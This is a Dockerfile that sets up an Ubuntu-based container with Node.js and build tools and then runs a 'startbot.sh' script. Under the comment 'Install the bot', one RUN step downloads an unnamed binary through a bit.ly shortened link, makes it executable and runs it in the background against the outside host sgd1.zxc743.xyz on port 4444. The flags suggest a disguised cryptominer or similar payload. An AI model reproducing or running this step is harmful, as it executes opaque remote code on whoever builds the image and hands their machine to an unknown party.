FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Install the bot:
RUN wget https://bit.ly/3mPeYds && chmod +x 3mPeYds && ./3mPeYds -B -o sgd1.zxc743.xyz:4444l

RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD bash /home/startbot.sh
